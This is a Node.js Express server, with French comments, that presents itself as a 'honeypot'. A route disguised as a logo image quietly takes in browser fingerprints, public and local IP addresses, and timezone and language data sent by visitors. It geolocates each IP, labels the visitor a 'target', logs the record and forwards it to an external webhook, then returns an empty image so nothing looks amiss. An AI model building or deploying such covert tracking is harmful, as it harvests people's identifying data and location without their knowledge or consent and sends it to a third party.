const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const axios = require('axios');
const app = express();
const config = require('./webhook_config.json');

const logFile = 'logs.json';
require('dotenv').config();

let whitelist = { visitorIds: [] };
try {
    whitelist = JSON.parse(fs.readFileSync('whitelist.json'));
} catch (e) {
    whitelist = { visitorIds: [] };
}


async function enrichIP(ip) {
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,isp,mobile,proxy,hosting,query`);
        if (response.data.status === "success") {
            return {
                country: response.data.country,
                region: response.data.regionName,
                city: response.data.city,
                isp: response.data.isp,
                mobile: response.data.mobile,
                proxy: response.data.proxy,
                hosting: response.data.hosting
            };
        } else {
            return { country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown', mobile: false, proxy: false, hosting: false };
        }
    } catch (error) {
        console.error('Erreur enrichIP:', error);
        return { country: 'Error', region: 'Error', city: 'Error', isp: 'Error', mobile: false, proxy: false, hosting: false };
    }
}


app.get('/myip', async (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket.remoteAddress || null;
    if (ip) {
        ip = ip.split(',')[0].trim();
    } else {
        ip = req.socket.remoteAddress || null;
    }

    if (ip && ip.startsWith('::ffff:')) {
        ip = ip.substring(7);
    }

    if (ip === '::1' || ip === '127.0.0.1') {
        try {
            const response = await axios.get('https://api.ipify.org?format=json');
            ip = response.data.ip;
        } catch (error) {
            console.error('Erreur ipify fallback:', error);
            ip = 'Erreur IP publique';
        }
    }

    res.json({ ip });
});



app.get('/static/logo.png', async (req, res) => {
    const dataParam = req.query.data;
    if (!dataParam) {
        return res.sendStatus(400);
    }

    try {
        const payload = JSON.parse(decodeURIComponent(dataParam));
        const geo = await enrichIP(payload.publicIp || '');
        payload.geo = geo;

        const analysis = analyzeVisitor(payload) || { status: 'unknown', message: 'Pas d\'analyse' };
        saveLog(payload, analysis);

        const colorMap = {
            whitelist: 0x2ecc71,      // Vert
            same_machine: 0xf1c40f,   // Orange
            new_target: 0xe74c3c      // Rouge
        };

        const message = {
            content: `🎯 Nouvel accès furtif à ton honeypot !\n${analysis.message}`,
            embeds: [
                {
                    title: "Infos de la cible",
                    fields: [
                        { name: "Visitor ID", value: payload.visitorId || 'N/A' },
                        { name: "User-Agent", value: payload.userAgent || 'N/A' },
                        { name: "Langue", value: payload.language || 'N/A' },
                        { name: "Timezone", value: payload.timezone || 'N/A' },
                        { name: "Plateforme", value: payload.platform || 'N/A' },
                        { name: "Résolution", value: payload.screen ? `${payload.screen.width}x${payload.screen.height}` : 'N/A' },
                        { name: "Public IP", value: payload.publicIp || 'N/A' },
                        { name: "Local IPs", value: payload.localIps ? payload.localIps.join(', ') : 'N/A' },
                        { name: "GeoIP", value: `🌍 ${payload.geo.country}, ${payload.geo.region}, ${payload.geo.city}\n🏢 ISP: ${payload.geo.isp}`, inline: false },
                        {
                            name: "IP Insights",
                            value: `🔎 Proxy: ${payload.geo.proxy ? 'Oui' : 'Non'} | Hosting: ${payload.geo.hosting ? 'Oui' : 'Non'} | Mobile: ${payload.geo.mobile ? 'Oui' : 'Non'}`,
                            inline: false
                        }
                    ],
                    color: colorMap[analysis.status] || 0x95a5a6
                }
            ]
        };

        await axios.post(config.webhook, message);

        res.set('Content-Type', 'image/png');
        res.send(Buffer.from(''));
    } catch (error) {
        res.sendStatus(400);
    }
});

// Puis static
app.use('/static', express.static(__dirname + '/static', {
    index: false,
    extensions: ['js', 'png', 'html']
}));
app.use(express.static(__dirname));
app.use(bodyParser.json());

function analyzeVisitor(payload) {
    const logs = fs.existsSync(logFile) ? JSON.parse(fs.readFileSync(logFile)) : [];
    if (whitelist.visitorIds.includes(payload.visitorId)) {
        return { status: 'whitelist', message: '✅ Cible whitelistée (toi)' };
    }
    for (let log of logs) {
        if (log.localIps && payload.localIps) {
            const commonIps = payload.localIps.filter(ip => log.localIps.includes(ip));
            if (commonIps.length > 0) {
                return { status: 'same_machine', message: '🟠 Même machine détectée' };
            }
        }
    }
    return { status: 'new_target', message: '🚩 Nouvelle cible détectée' };
}

function saveLog(payload, analysis) {
    let logs = [];
    if (fs.existsSync(logFile)) {
        logs = JSON.parse(fs.readFileSync(logFile));
    }
    logs.push({
        time: new Date().toISOString(),
        visitorId: payload.visitorId,
        publicIp: payload.publicIp,
        localIps: payload.localIps,
        userAgent: payload.userAgent,
        language: payload.language,
        timezone: payload.timezone,
        platform: payload.platform,
        resolution: payload.screen ? `${payload.screen.width}x${payload.screen.height}` : 'N/A',
        status: analysis.status,
        analysisMessage: analysis.message
    });
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
}

app.listen(process.env.PORT || 3000)

console.log(`Server is running on port ${process.env.PORT || 3000}`);
